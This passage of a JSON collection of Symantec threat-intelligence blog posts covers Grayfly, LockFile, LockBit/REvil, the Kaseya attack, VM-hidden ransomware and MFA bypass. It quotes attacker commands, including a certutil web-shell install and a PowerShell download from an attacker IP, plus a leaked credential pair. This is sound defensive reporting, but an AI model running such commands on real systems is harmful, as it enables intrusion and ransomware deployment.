of the recent campaign was that the group appeared to be particularly interested in attacking exposed Microsoft Exchange or MySQL servers. This suggests that the initial vector may be the exploit of multiple vulnerabilities against public-facing servers. In at least one attack, the suspicious Exchange activity was followed by PowerShell commands used to install an unidentified web shell. Following this, the malicious backdoor was executed. After the installation of the backdoor, the attackers deployed a custom version of the credential-dumping tool Mimikatz. This version of Mimikatz has been used previously in Grayfly attacks. The first indication of attacker activity was identified at 20:39 local time, where a Base64-encoded PowerShell command was executed via a legitimate Exchange Server-related process. The command was used to execute certutil to decode and install a web shell: >(^_certutil -decode -f C:\\Windows\\Temp\\ImportContactList_-.aspx C:\\Windows\\Temp\\ImportContactList.aspx;if((dir C:\\Windows\\Temp\\ImportContactList.aspx).Length -eq 212){Remove-Item -Force C:\\Windows\\Temp\\ImportContactList_*-*.aspx}* Next, another Base64-encoded PowerShell command was executed. This command was used to move the web shell to the Exchange install path, accessible by the attackers – specifically the ClientAccess\\ecp directory. Several minutes later, a backdoor was executed via installutil.exe: Roughly an hour later, the attackers were observed executing a WMIC command in order to run a Windows batch file. This file was used to create a scheduled task to execute the backdoor and ensure persistence: Shortly after this, Mimikatz was executed to dump credentials: After this point, no further activity was observed. Three Chinese men were indicted in the U.S. in 2020 for their involvement in attacks that involved Grayfly tools and tactics. At the time of the indictment, Jiang Lizhi, Qian Chuan, and Fu Qiang were based in the Chinese city of Chengdu and held senior positions in a company called Chengdu 404. The company describes itself as a network security specialist and claims to employ a team of white hat hackers who can perform penetration testing along with other security operations. The indictment charged the men with involvement in attacks against over 100 different organizations in the U.S., South Korea, Japan, India, Taiwan, Hong Kong, Malaysia, Vietnam, India, Pakistan, Australia, the United Kingdom, Chile, Indonesia, Singapore, and Thailand. Jiang was said to have a “working relationship” with the Chinese Ministry of State Security which would provide him and his associates with a degree of state protection. Grayfly is a capable actor, likely to continue to pose a risk to organizations in Asia and Europe across a variety of industries, including telecommunications, finance, and media. It's likely this group will continue to develop and improve its custom tools to enhance evasion tactics along with using commodity tools such as publicly available exploits and web shells to assist in their attacks. For the latest protection updates, please visit theSymantec Protection Bulletin. The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/grayfly-china-sidewalk-malware"
  },
  {
    "title": "lockfile ransomware new petitpotam windows",
    "content": "UPDATE August 23: Third parties have identified a ProxyShell exploit as a potential vector for the PowerShell-related commands that are identified in this blog.Researcher Kevin Beaumontfirst spotted that ProxyShell was being exploited from 209.14.0[.]234 on August 13. The ProxyShell and LockFile link is also mentionedin this Twitter thread. Protection information has been updated below based on this new information. What appears to be a new ransomware family is being used to target victims in various industries around the globe. The LockFile ransomware was first observed on the network of a U.S. financial organization on July 20, 2021, with its latest activity seen as recently as August 20. LockFile has been seen on organizations around the world, with most of its victims based in the U.S. and Asia. Indications are that the attackers gain access to victims' networks via Microsoft Exchange Servers, and then usethe incompletely patched PetitPotam vulnerabilityto gain access to the domain controller, and then spread across the network. It is not clear how the attackers gain initial access to the Microsoft Exchange Servers. Victims are in the manufacturing, financial services, engineering, legal, business services, and travel and tourism sectors. The attackers behind this ransomware use a ransom note with a similar design to that used by the LockBit ransomware gang (Figure 1)and reference the Conti gang in the email address they use - contact@contipauper[.]com. Exchange servers are compromised through an as yet unidentified technique. On exploitation, the attacker executes a PowerShell command such as the following: powershell wget hxxp://209.14.0[.]234:46613/VcEtrKighyIFS5foGNXH Otherpowershell wgetcommands to the same IP address use similar seemingly random high port numbers. It is unknown exactly what is downloaded by the PowerShell command; however, the attackers maintain access on victim networks for at least several days before beginning the ransomware attack. Typically around 20 to 30 minutes prior to deploying ransomware, the attackers install a set of tools onto the compromised Exchange Server. Included in these tools is: The active_desktop_launcher.exe is a legitimate version of KuGou Active Desktop. The executable is being used in a DLL search order loading attack to load a malicious active_desktop_render.dll file. This active_desktop_render.dll file, when loaded by the active_desktop_launcher.exe, attempts to load and decrypt a file in the local directory called “desktop.ini”. If the file is successfully loaded and decrypted, shellcode from the file is executed. As the investigation into these attacks is ongoing, a copy of “desktop.ini” has yet to be retrieved for analysis. The encrypted shellcode, however, very likely activates the efspotato.exe file that exploits PetitPotam. This is an NTLM relay attack bug that can be used by a low-privileged attacker to take over a domain controller. It was patched inMicrosoft’s August Patch Tuesdayrelease, but it subsequently emerged that the fix released reportedly did not fully patch the vulnerability. Once access has been gained to the local domain controller, the attackers copy over the LockFile ransomware, along with a batch file and supporting executables, onto the domain controller. These files are copied into the “sysvol\\domain\\scripts” directory. This directory is used to deploy scripts to network clients when they authenticate to the domain controller. This means that any clients that authenticate to the domain after these files have been copied over will execute them. The files that are copied into the Sysvol directory are: The Autoupdate.exe file is a variant of the LockFile payload, which is unique to each organization targeted. The Autologin.exe, Autlogin.dll, and Autologin.sys files are all part of a toolkit called the Kernel Driver Utility (KDU -https://github.com/hfiref0x/KDU). Autologin.dll is the “Tanikaze.dll” component, and the autologin.exe is the “Hamakaze” component. It is currently unclear exactly how the KDU tool is utilized by the attacker in conjunction with the ransomware. Regardless of how they are utilized, the LockFile ransomware is ultimately executed. LockFile appears to be a new threat on the already crowded ransomware landscape. The investigation into this threat, and whether it may have links to any previously seen or retired ransomware threats continues. This is an ongoing investigation and Symantec, part ofBroadcom Software, may update this blog with new information if it comes to light. The following protections are in place to protect customers against LockFile attacks: For the latest protection updates, please visit theSymantec Protection Bulletin. Symantec Data Center Security default hardening policies for Microsoft Exchange servers and Windows Domain Controllers protect against ProxyShell vulnerabilities and prevent LockFile ransomware attacks on Domain Controllers. The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/lockfile-ransomware-new-petitpotam-windows"
  },
  {
    "title": "ransomware trends lockbit sodinokibi",
    "content": "The shutdown of the Leafroller ransomware gang (aka Sodinokibi/REvil) has resulted in a surge in LockBit activity, as some ex-Sodinokibi affiliates move to that ransomware. Meanwhile, there is also more evidence that some attackers are affiliated to more than one ransomware group and are switching between ransomware families mid-attack if the initial ransomware they attempt to deploy fails to execute. These are just the latest developments Symantec, part ofBroadcom Software, has seen as ransomware actors continue to evolve their tactics to make their attacks more dangerous and effective. Attacks involving the LockBit ransomware have increased markedly over the past month, with some indications that the group behind it is attempting to fill the gap left by the Sodinokibi ransomware. Sodinokibi’sinfrastructure and websites disappeared on July 12, 2021, shortly after the group had carried out a major ransomware attack in which it encrypted approximately 60 managed service providers (MSPs) and more than 1,500 individual businesses usinga zero-day vulnerability in the Kaseya VSA remote management software. It’s unclear why exactly the gang’s operations shut down, but it has been speculated that the gang shuttered their activity following either pressure or action by law enforcement. Symantec researchers have seen evidence that at least one former Sodinokibi affiliate is now using LockBit. Symantec has observed an attacker using consistent tactics, tools, and procedures (TTPs) attempting to deliver Sodinokibi to victims until July of 2021, when the payload switched to LockBit. LockBit (aka Syrphid) was first seen in September 2019, and launched its ransomware-as-a-service (RaaS) offering in January 2020, however, there was a marked increase in its activity in the last month as it seemingly attempted to recruit former Sodinokibi affiliates. This recent attack began with a file named mimi.exe, which is an installer that drops a number of password-dumping tools. Immediately prior to the ransomware being launched, a large number of commands were executed to disable various services, block access to remote desktop protocol (RDP), and delete shadow copies. This is activity we typically see before ransomware is deployed on a system. The actor behind this attack consistently named their ransomware payload as svhost.exe and this practice was maintained following their transition to LockBit. The actors behind recent LockBit campaigns were seen using a variety of different TTPs before deploying the ransomware payload, including: The numerous password-dumping tools used by these attackers indicates that harvesting credentials is a key part of their attack chain. In another ransomware attack that occurred in June 2021, it appears that attackers who usually encrypt networks using the Conti ransomware switched payloads and used the Sodinokibi ransomware instead. Initial activity in this attack followed the attackers’ usual playbook, deploying Cobalt Strike, an off-the-shelf remote access tool commonly seen used in ransomware attacks. This would usually be followed by them delivering Conti. Conti first appeared in December 2019 and has been seen used in some high-profile recent ransomware attacks, many targeting healthcare providers, including a May 2021 ransomware attackthat crippled Ireland’s public health service provider, the HSE. However, in this recent attack, instead of deploying Conti, the attackers switched payloads and deployed Sodinokibi to encrypt several hundred machines on the network. Before Sodinokibi was deployed we saw the attackers use BitsAdmin when moving across the victim network, while they also carried out some other preliminary activity before deploying the ransomware, including disabling Microsoft Defender, disabling RealTime Monitoring, and deleting shadow copies. The attackers maintained a presence on the victim network for approximately three weeks before the Sodinokibi ransomware was deployed. While not common up to now, this isn’t the first time we have seen evidence of affiliates appearing to have access to more than one ransomware family at the same time. In the attack we talked about in our blogRansomware: Growing Number of Attackers Using Virtual Machines,there was evidence the attacker had access to both the Mount Locker and Conti ransomware, and may have attempted to run one payload on a virtual machine and, when that didn’t work, ran Mount Locker on the host computer instead. Affiliates switching between different ransomware families like this is yet another attempt by ransomware actors to increase the chances of their attacks succeeding, and it will be interesting to see whether or not this is a tactic we start to increasingly observe during ransomware attacks. Having access to multiple ransomware families increases the likelihood of affiliates being able to encrypt machines, increasing the dangers posed by these already dangerous attacks. This is just the latest development we have seen from ransomware actors, who are constantly refining their tactics in order to maximise their profits. The use of virtual machines was another example of attackers tweaking their approach in order to carry out a ransomware attack, while the emergence of double-extortion ransomware attacks last year, where attackers steal data and threaten to release it while also encrypting machines in ransomware attacks, led to one of the biggest shifts we saw in the ransomware landscape in recent times. The surge in LockBit activity that we have seen also shows that while some big ransomware names have shut down their operations in recent times, there are many other ransomware operators waiting to fill the space that has been left. Ransomware actors continue to change and refine their tactics in an effort to evade the security steps taken by organizations to stop these types of attacks, which is why ransomware remains one of the biggest threats on the cyber crime landscape in 2021. For the latest protection updates, please visit theSymantec Protection Bulletin. The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/ransomware-trends-lockbit-sodinokibi"
  },
  {
    "title": "critical infrastructure south east asia espionage",
    "content": "Four critical infrastructure organizations in a South East Asian country were targeted in an intelligence-gathering campaign that continued for several months.  (Read the whitepaperhere.) Among the organizations targeted were a water company, a power company, a communications company, and a defense organization, with evidence the attackers were interested in information about SCADA systems. The attacks were ongoing from at least November 2020 to March 2021, several months before the Colonial Pipeline attack that drew the attention of the world to the danger posed by attacks on critical infrastructure, and may have begun even earlier than that. An attacker gaining access to multiple critical infrastructure organizations in the same country could potentially give malicious actors access to a vast amount of sensitive information. There are numerous indications that the same attacker was behind all the attacks, including: There are some indications that the attacker behind this campaign is based in China, but with the current information available, Symantec cannot attribute the activity to a known actor. Credential theft and lateral movement across victim networks seemed to be a key aim of the attacker, who made extensive use of living-off-the-land tools in this campaign. Among the living-off-the-land or dual-use tools used were: The attacker was also seen exploiting a legitimate multimedia player to load a malicious DLL via search order hijacking, as well as exploiting another legitimate tool to load suspicious files onto victim machines. We did not see what the initial infection vector used by the attacker to get onto targeted networks was, but we did have good insight into how they moved through infected networks. The first activity we saw in the attack on this organization was suspicious use of WMI. We then saw a legitimate free multimedia player called PotPlayer Mini being exploited to load a malicious DLL. Ithas previously been publicly documentedthat this player is susceptible to DLL search order hijacking, which is not a new technique but is one we see frequently leveraged by attackers to insert malicious files onto victim machines. We saw PotPlayer Mini added as a service to launch a file called potplayermini.exe, we then saw multiple dual-use and hacking tools launched, including: ProcDump was used for credential theft by abusing the LSASS.exe process, and domain shares were enumerated using net view. We then observed a suspected tunneling tool being launched on the system. We did not observe the attackers exfiltrating data from the infected machines. However, the machine the attackers were on did have tools on it that indicate it may have been involved in the design of SCADA systems, indicating this is something the attacker may have been interested in. PotPlayer Mini was also exploited on the power company network to carry out DLL search order hijacking, and ProcDump was deployed alongside another payload that we suspect was malware. We also saw the attacker once again carrying out credential theft by using ProcDump of the LSASS.exe process. There were indications that the infected machine in this company may also have been involved in engineering design. File overlap, as well as the similar tactics used, point to the same actor being behind the attacks on the water and power companies. Meanwhile, in the attack on the communications company the attacker exploited a different legitimate tool, Google Chrome Frame, with suspicious files appearing where chrome_frame_helper.exe was the parent file. Google Chrome Frame is a legitimate plugin for Internet Explorer that enables rendering of the full browser canvas using Google Chrome's rendering engine. It wasn’t clear if Google Chrome Frame was already present on the infected machine in this company or if it was introduced by the attacker, as it was the parent file of legitimate as well as suspicious files. PotPlayer Mini also appeared to be exploited on this machine by the attacker for malicious purposes. PAExec, a tool similar to PsExec, launched at.exe (a Windows task scheduler), in order to schedule execution of chrome_frame_helper.exe as a task. WMI was used to run chrome_frame_helper.exe and perform credential theft by dumping LSASS. PAExec and WMIC were also used for lateral movement and to launch chrome_frame_helper.exe against an internal IP address. PAExec also launched it to schedule execution of an unknown batch file as a daily task, and chrome_frame_helper.exe was also used to launch the SharpHound domain trust enumeration tool and other suspicious files. PAExec was also seen executing what appeared to be Mimikatz for suspected credential theft. WMI was also used to run chrome_frame_helper.exe to execute a net.exe command to connect a hidden C$ share. C$ shares are administrator shares that are not visible when viewing another computer's shares, but are accessible to those with administrator privileges on a machine. These types of shares are frequently used by malicious actors to stealthily transfer malware across a network and to collect stolen data. However, it is not clear what the C$ share was used for on this network. We also saw persistence created for chrome_frame_helper.exe as a scheduled task - GoogleUpdateTaskMachineCore4f23 - with the file disguised as chrome_proxy1.exe. A keylogger and several other files seen on the network of this organization were also seen on the network of the water company. In the defense organization we once again saw PotPlayer Mini exploited for DLL search order hijacking, as well as seeing some file overlaps between this organization and the communications and water companies. While we cannot definitively say what the end goal of the attacker was in these attacks, espionage seems like the likeliest motive. This is indicated by the activity we did see - credential stealing, lateral movement, keyloggers being deployed - and the types of machines targeted in some of the organizations - those involved in design and engineering. The ability of the attacker to maintain a stealthy presence on the targeted networks for a number of months indicates they were skilled. Certain artifacts found on the victim machines indicate the attacker may be based in China, though it is not possible with the information we have to definitively attribute these attacks to a named actor. A skilled malicious actor from a different country gaining a deep insight into a country’s critical infrastructure by compromising multiple critical infrastructure organizations, including a defense organization, could deliver a lot of valuable intelligence into the hands of adversaries. The Colonial Pipeline attack in the U.S. in May 2021 showed the serious repercussions attacks on critical infrastructure can have, and this campaign makes it clear that it is not just U.S. infrastructure that is under threat from malicious actors. The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/critical-infrastructure-south-east-asia-espionage"
  },
  {
    "title": "kaseya ransomware supply chain",
    "content": "UPDATE July 5 2021:Our blog has been updated with more details on how the ransomware was executed along with additional protection information. Several hundred organizations have been targeted by the REvil (aka Sodinokibi) ransomware in a supply chain attack involving Kaseya VSA software and multiple Managed Service Providers (MSPs) who use it. News of the attack broke yesterday (Friday 3 July), prompting Kaseya to urge VSAusers to shut down their VSA serversto prevent them from being compromised. The attack may have been timed to coincide with the 4th of July holiday weekend in the U.S., where many organizations may be lightly staffed. Are Symantec customers protected? Yes, Symantec Endpoint products proactively blocked tools used to deliver the ransomware payload in this wave of attacks. How many organizations are affected? According to Kaseya only a very small percentage of their customers were affected, “currently estimated at fewer than 40 worldwide”. However, each of those organizations may be MSPs with multiple customers. Current reports suggest hundreds of victims. How was REvil delivered to computers during these attacks? While the exploit used to breach Kaseya VSA server side has not yet been fully documented, it is known that the attackers delivered a malicious script and an ASCII PEM named agent.crt to Kaseya VSA clients. The dropper masqueraded inside the ASCII PEM file, which was decoded using certutil after attempts to disable Microsoft Defender. It dropped two resources, an old, but legitimate copy of Windows Defender (MsMpEng.exe) and custom malicious loader. The dropper writes the two files to disk and executes MsMpEng.exe which then side loads and executes the custom loader's export (mpsvc.dll). What was the motivation for the attacks? REvil attacks are usually financially motivated. However, there are some signs that the attacks may be politically motivated disruption. The attackers have, on occasion, appeared to have a political motive in their selection of targets. In this attack, strings in the payload made references to President Joe Biden, ex-president Donald Trump, and Black Lives Matter. The attackers demanded a ransom of $45,000, which may be another reference to Trump, who was the 45th president of the U.S. Furthermore, REvil’s Tor payment site is down at the time of writing, meaning victims will have no way of paying a ransom. Whether the group is having technical difficulties or whether it never intended to collect a ransom remains unclear. What is REvil/Sodinokibi? REvil (detected as Ransom.Sodinokibi) is a family of ransomware developed by a cybercrime group Symantec calls Leafroller. The ransomware is used in targeted attacks, where the attackers attempt to encrypt all computers on the victim’s network in the hope of extorting a large ransom. The group is known to steal victim data prior to encryption and threaten to release it unless a ransom is paid. Leafroller is one of the most established and prolific targeted ransomware groups in operation. Prior to its development of REvil, the group was associated with an older ransomware family known as Gandcrab. Leafroller is known to operate a Ransomware-as-a- Service, where its sells its tools to collaborators known as affiliates in exchange for a cut of any ransom payments they obtain. Tools associated with these attacks will be detected and blocked on machines running Symantec Endpoint products. File-based protection: Network-based protection: For the latest protection updates, please visit theSymantec Protection Bulletin. d55f983c994caa160ec63a59f6b4250fe67fb3e8c43a388aec60a4a6978e9f1e - Dropper df2d6ef0450660aaae62c429610b964949812df2da1c57646fc29aa51c3f031e - Dropper dc6b0e8c1e9c113f0364e1c8370060dee3fcbe25b667ddeca7623a95cd21411f  - Dropper aae6e388e774180bc3eb96dad5d5bfefd63d0eb7124d68b6991701936801f1c7  - Dropper 66490c59cb9630b53fa3fa7125b5c9511afde38edab4459065938c1974229ca8  - Dropper 81d0c71f8b282076cd93fb6bb5bfd3932422d033109e2c92572fc49e4abc2471  - Dropper 1fe9b489c25bb23b04d9996e8107671edee69bd6f6def2fe7ece38a0fb35f98e  - Dropper 8dd620d9aeb35960bb766458c8890ede987c33d239cf730f93fe49d90ae759dd  - Sodinokibi e2a24ab94f865caeacdf2c3ad015f31f23008ac6db8312c2cbfb32e4a5466ea2  - Sodinokibi d8353cfc5e696d3ae402c7c70565c1e7f31e49bcf74a6e12e5ab044f306b4b20  - Sodinokibi d5ce6f36a06b0dc8ce8e7e2c9a53e66094c2adfc93cfac61dd09efe9ac45a75f  - Sodinokibi cc0cdc6a3d843e22c98170713abf1d6ae06e8b5e34ed06ac3159adafe85e3bd6  - Sodinokibi 0496ca57e387b10dfdac809de8a4e039f68e8d66535d5d19ec76d39f7d0a4402  - Sodinokibi 8e846ed965bbc0270a6f58c5818e039ef2fb78def4d2bf82348ca786ea0cea4f  - Sodinokibi The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/kaseya-ransomware-supply-chain"
  },
  {
    "title": "ransomware virtual machines",
    "content": "Symantec has found evidence that an increasing number of ransomware attackers are using virtual machines (VMs) in order to run their ransomware payloads on compromised computers. The motivation behind the tactic is stealth. In order to avoid raising suspicions or triggering antivirus software, the ransomware payload will “hide” within a VM while encrypting files on the host computer. The tactic is a recent development,having been documented by Sophosin connection with RagnarLocker last year. In that case, ransomware was run from inside an Oracle VirtualBox Windows XP VM. During a recent investigation into an attempted ransomware attack, Symantec discovered that the attackers had installed a VirtualBox VM on some compromised computers. Unlike the previously documented RagnarLocker attacks, which involved Windows XP, the VM in this case appeared to be running Windows 7. The VM was delivered to the target via a malicious installer file that used various file names, including: The installer created a file called runner.exe, which was a Golang (Go) executable compiled from the following source file: Apart from standard Go libraries, it used thego-ps libraryfor process enumeration. Embedded strings used by the executable, such as file names, process names, and commands, were obfuscated using four-byte XOR keys. Each string was encrypted using a unique key. This executable depended on multiple other files that were expected to be present in the same directory. Its main purpose was to install a VirtualBox VM in a headless mode. When executed, runner.exe performed following actions: The executable then dropped, executed, and deleted a file called starter.bat with the following content in order to mount a recovery partition: It then decrypted and dropped VirtualBox.xml, a VirtualBox configuration file, and micro.xml, a VM configuration file (see appendix). It created an SDRSMLINK directory and linked system files to that directory, e.g: It also adjusted the \"<SharedFolders>\" section in micro.xml to reflect files and directories linked in CSIDL_WINDOWS\\SDRSMLINK. It then initialized VirtualBox components: It enumerated and cleared Windows system logs using WEvtUtil.exe: Symantec did not obtain a VM image, but what likely occurred next was that the ransomware payload was located on the VM's disk and auto started once the operating system was fully booted. The VM likely had access to the host computer’s files and directories (via \"SharedFolders\" set up by runner.exe), allowing it to encrypt files on the host computer. While the payload running in the VM was not identified, there were reasonably strong indicators that it was Conti. A username and password combination (nuuser/7HeC00l3stP@ssw0rd) used in these attacks was previously associated with older Conti activity, dating from April 2021. However, on the same computer that the VM was deployed on, Symantec also observed Mount Locker being deployed, raising the question as to whether the payload was actually Mount Locker. Since the main purpose of running a payload on a VM is to avoid detection, it doesn’t make much sense for the attacker to also deploy the payload on the host computer. One possible explanation is that the attacker is an affiliate operator with access to both Conti and Mount Locker. They may have attempted to run a payload (either Conti or Mount Locker) on a virtual machine and, when that didn’t work, opted to run Mount Locker on the host computer instead. Ransomware operators are continually refining their tactics in a bid to stay one step ahead of detection. Many are now heavily relying on legitimate and dual-use tools in order to stage attacks on targeted networks. The ransomware payload itself is often the stage of the attack most likely to raise red flags and, by hiding it in a virtual machine, there is an expectation that it may not be discovered. Organizations should exercise increased vigilance in relation to the unauthorized installation of virtual machines on their networks. For the latest protection updates, please visit theSymantec Protection Bulletin. The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/ransomware-virtual-machines"
  },
  {
    "title": "targeted ransomware ecosystem",
    "content": "When it comes to choosing their victims, ransomware attackers have become brutally adept at finding pain points. Their targets range from hospitals, schools, and local government to key infrastructure, such as water treatment and fuel pipelines – and they’re succeeding. Ransomware gangs have aggressively honed their tactics over time while ransomware creators franchise their tools to affiliates in exchange for a cut of the loot. Hardly a day goes by without news of another organization being hit by one of these groups. No longer just a criminal menace, the ransomware scourge now affects society as a whole, reaching a point where it has drawncomparisonsto the challenge the nation faced following the September 11, 2001, terrorist attacks. The time has come to change the dynamic that has developed around ransomware. While ransom payments may be sometimes unavoidable, ransom payment should be a measure of last resort, not the first response. Cyber insurance should be there to compensate victims, not reward attackers. Governments should recognize the key role they can play in assisting victims, both technically and financially. The Conti ransomware attack against Ireland’s national health service, the Health Service Executive (HSE), starkly illustrates the gravity of the threat we now face. In the middle of a global pandemic, attackers crippled its network, causing massive disruption to vital services and forcing it to cancel medical appointments. While the attackers subsequently released a decryption key, they are still attempting to hold the HSE to ransom by threatening to release sensitive patient records stolen during the attack. It would be a mistake to assume that the HSE was an unintentional victim of an indiscriminate campaign. We have no doubt that the attackers knew who they were infecting. It’s hardly a coincidence that the Irish government’s Department of Health was also targeted, albeit less successfully. Crippling the country’s health system appeared to be the end goal. And,as the FBI highlighted last month, attackers using Conti have previously targeted at least 16 healthcare and first responder organizations in the U.S. alone. Attacks such as these can require a high degree of interaction from malware operators, both to successfully deploy the ransomware across the victim’s network and, at the same time, to profile the victim to better estimate the amount of ransom they’re likely to pay based on the success of the attacker’s activity and the quality of the data available for exfiltration. The group behind the HSE attack proceeded with their attack because they knew the disruption it would cause at this key point in the Irish response to the COVID-19 pandemic could lead to a major payoff. Too often, the commentary following a major ransomware attack such as this focuses on the victim, asking whether they had done enough to secure their network. While there is an obvious duty on the part of the victim to make every effort to protect the IT systems and data on which it depends, to solely blame the victim for the attack is overly simplistic and distorts an understanding of the wider issue of why ransomware has become such a stunningly successful criminal enterprise. Aside from the fact that over-zealous public criticism of victims only encourages more victims to quietly capitulate and pay, it also draws attention away from the true perpetrators. The criminals behind targeted ransomware are now among the most technically proficient and well-resourced threat groups operating today. Blockchain analysis company Chainalysisestimated that ransomware gangs netted just under $350 million in 2020, a massive 311% increase over 2019. The scale of ransom payouts now means that the most successful groups will have a bigger operating budget than the victim’s network defenders in all but the largest of organizations. This allows them to operate both at a massive scale and also to persist in their attacks until they’re successful. The Irish government is to be commended for not bowing to pressure and paying a ransom. This is a stance that may be put under increasing pressure in the weeks and months ahead, particularly if the restoration of services proves slow or if sensitive medical data is leaked online. Nevertheless, it is the right decision. It is an unfortunate fact that there will be occasions when some victims will find themselves with no choice other than to pay the ransom. However, we are deeply concerned about how regularly the response to a ransomware attack has begun to resemble a professional transaction—a simple business cost. All too often, ransoms appear to be paid because the cost of the ransom is calculated as being lower than the short-term cost of restoring the victim’s IT systems from backups or because the ransom payment is covered by cyber insurance. These decisions are based on a short-term calculus, ignoring the long-term consequences of continuing to invest in an unhealthy ecosystem where ransomware attackers thrive and multiply. Over the long term, it’s going to do far more good for insurance payouts to go exclusively to the victims to reestablish their operations. This may cost more in the short term and raise costs for insurers and the premiums they charge, but taking a broader view, it’s the only way of cutting off ransomware criminals from the proceeds of their crimes and deterring future ransomware criminality. Governments have become alert to the role they need to play in tackling what is increasingly a societal problem. Much of the focus so far has been on the more obvious role government can play in providing IT security guidance and where necessary, defining security and reporting regulation for critical organizations. However, we suggest a more strategic way of tackling the ransomware threat specifically also needs to be considered. Many organizations, especially small businesses and local government, don’t have the technical resources to quickly recover their operations. To make it easier for ransomware victims to refuse to pay the extortion demands, government should also consider the role it can play in providing not only technical guidance but also supplying direct technical and financial support to these ransomware victims with the aim of getting them back on their feet as soon as possible. The threat of cyber criminals selling or publicizing stolen data is also forcing organizations into paying ransoms and this is increasingly as potent a tool in extorting a ransom as the outright crippling of IT systems, especially for public bodies that have a legal obligation regarding the protection of customer or user data. More can be done to reduce the impact of this type of crime. The Irish Health Service Executive’s response to its ransomware breach suggests a way forward.The HSE secured a legal injunction from the Irish High Court, restraining any sharing, processing, selling, or publishing of the stolen data. While a legal response rarely deters cyber criminals, it does have real value in reducing the likelihood of personal information being shared online or via social media, lessening the pressure on victims to pay extortion money to the ransomware criminals. We can’t pretend that fixing the toxic dynamic around ransomware is going to be easy. It is also clear that things are continuing to get worse and will only get better by combining effective detection and defense against ransomware with an increased focus on reducing the financial attraction of this activity to cyber criminals. As we saw with the addition of stolen data blackmail being added to ransoming IT systems, ransomware gangs have shown themselves adept at finding new techniques to pressure their victims and will certainly redouble their efforts if they encounter resistance. Whatever approach they take can only be defeated by further improving our ability make it harder for ransomware attacks to be successful, while at the same time equal effort needs to be made to reduce or remove entirely the money that feeds the criminals at the center of the ransomware ecosystem. We can put the odds back in our favor by making it harder for ransomware attackers to get away with it. That means more effective detection and defense. At the same time, equal effort needs to be made to reduce – or remove entirely – the money that feeds the criminals at the center of the global ransomware ecosystem. Adam leads a global team of engineers and analysts who develop the game-changing security technologies, attack intelligence, and security content that protects Symantec and Carbon Black customers. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/targeted-ransomware-ecosystem"
  },
  {
    "title": "multi factor authentication new attacks",
    "content": "In recent years two-factor or multi-factor authentication (MFA) has been touted as the way to protect your personal and business accounts from attack. This led to the wide adoption of MFA - from corporate accounts to social media profiles, almost all provide the option of enabling MFA, with many requiring it. This means that, for attackers, stealing credentials or brute forcing passwords is no longer enough - if they don’t have access to victims’ multi-factor access token or code they will still not be able to access their accounts. The increasing use of MFA means that attackers have had to endeavor to find ways to bypass it, or avoid carrying out attacks that may be stalled by it. When we look at recent high-profile attacks, such as SolarWinds, the Microsoft Exchange Server ProxyLogon attacks, and the vulnerabilities found in Pulse Secure VPN recently, all these attacks help attackers avoid the hurdle of needing to overcome MFA. While MFA has perhaps only gained wide adoption in the last couple of years, attacks attempting to bypass MFAdate as far back as 2011, when RSA Security was forced to replace 40 million SecurID tokens - which were used for MFA at the time - after the company was hacked. However, recently, there have been some more notable examples of attacks that attempt to either bypass MFA, or eradicate the need to bypass it at all, with five of these outlined in this blog. On April 20, 2021, Pulse Secure published an advisory warning about a zero-day remote code execution vulnerability in its popular VPN product. On the same day,FireEye published a blogdetailing how the vulnerability (CVE-2021-22893) was being exploited by a China-linked APT group it tracks as UNC2630. FireEye said this group was attempting to leverage the vulnerability in attacks targeting defense industrial base (DIB) targets in the U.S. This new vulnerability was exploited, alongside a number of known Pulse Secure vulnerabilities, as the initial infection vector in these attacks. FireEye said that at least 12 malware families have been associated with exploit attempts against vulnerabilities in Pulse Secure. The malware was associated with what appears to be three threat actors, with attacks taking place in organizations in the U.S. and Europe. The UNC2630 activity that was analyzed by FireEye demonstrated that successfully exploiting this vulnerability in the VPN software allowed attackers to Trojanize shared objects with malicious code to log credentials and bypass authentication flows, including multi-factor authentication requirements. FireEye said it was tracking this activity as SlowPulse. The attackers were also able to maintain persistence, inject web shells, and modify files. VPNs became a very popular target for hackers over the last year, as increased working from home due to the pandemic meant that workers were increasingly using VPNs to log into their corporate networks. If an attacker is able to compromise the VPN software - through a vulnerability like this - it negates a need for them to acquire anything more in the line of multi-factor authentication. Apatch for this bug was issued on Monday(May 3), and all users of Pulse Secure should apply it quickly. Symantec has released Hacktool.Webshell and Hacktool.Atrium to block files believed to be related to this vulnerability. On March 2, Microsoft released emergency patches for four zero-day vulnerabilities in Microsoft Exchange Server that were being actively exploited by attackers in the wild. At the time, Microsoft said these vulnerabilities were being exploited by an APT group it dubbed Hafnium (Symantec tracks this group as Ant) in targeted attacks. However, it quickly became apparent that multiple threat actors had started exploiting these vulnerabilities, with numbers rising rapidly once the existence of the vulnerabilities became public knowledge. Two of the vulnerabilities (CVE-2021-26855andCVE-2021-27065) and the technique used to chain them together for exploitation were given the name“ProxyLogon”. Successful exploitation of these vulnerabilities allowed unauthenticated attackers to execute arbitrary code on vulnerable Exchange Servers, allowing them to gain persistent system access, access to files and mailboxes on the server, and access to credentials stored on the system. Successful exploitation may also allow attackers to compromise trust and identity in a vulnerable network. This gives attackers extensive access to infected networks, allowing them to steal potentially highly sensitive information from 